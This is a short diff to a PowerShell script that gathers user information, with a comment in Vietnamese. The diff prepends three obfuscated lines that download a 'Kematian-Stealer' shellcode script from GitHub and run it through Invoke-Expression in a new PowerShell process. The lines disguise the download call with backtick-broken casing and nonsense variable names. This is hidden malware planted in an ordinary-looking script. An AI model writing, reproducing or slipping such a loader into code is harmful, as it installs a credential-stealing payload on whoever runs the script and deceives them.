@@ -1,3 +1,7 @@
+$skibiditoilet = ("https://github.com/adasdasdsaf/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+$dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"
+Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -NoNewWindow -PassThru
+
 # Lấy thông tin User
 $user = $env:username
 
